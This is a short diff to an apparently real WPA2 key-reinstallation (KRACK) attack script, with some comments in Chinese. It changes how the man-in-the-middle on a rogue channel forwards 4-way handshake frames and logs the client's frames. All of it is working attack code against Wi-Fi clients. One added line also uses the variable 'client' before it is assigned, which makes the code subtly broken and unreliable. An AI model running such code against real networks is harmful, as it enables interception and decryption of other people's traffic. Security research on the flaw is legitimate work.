@@ -170,7 +170,7 @@ class ClientState():
 			# Forwarding rules when attacking the 4-way handshake
 			if self.state in [ClientState.Connecting, ClientState.GotMitm, ClientState.Attack_Started]:
 				# Also forward Action frames (e.g. Broadcom AP waits for ADDBA Request/Response before starting 4-way HS).
-				# 四次交握不轉送 msg2 & msg4
+				# 四次交握不轉送 msg4
 				return p.haslayer(Dot11Auth) or p.haslayer(Dot11AssoReq) or p.haslayer(Dot11AssoResp) or (1 <= get_eapol_msgnum(p) and get_eapol_msgnum(p) <= 3) or (p.type == 0 and p.subtype == 13)
 			return self.state in [ClientState.Success_Reinstalled]
 
@@ -483,7 +483,12 @@ class KRAckAttack():
 				will_forward = True
 			# Always display all frames sent by the targeted client
 			elif p.addr2 == self.clientmac:
-				print_rx(INFO, "Rogue channel", p, suffix=" -- no forward")
+				will_forward = client.should_forward(p, args.group)
+				client = self.clients[p.addr2]
+				if (will_forward):
+					print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing")
+				else:
+					print_rx(INFO, "Rogue channel", p, suffix=" -- no forward")
 			# 否則，確認是否是正在追蹤的client端，that we are tracking/MitM'ing
 			elif p.addr2 in self.clients:
 				client = self.clients[p.addr2]
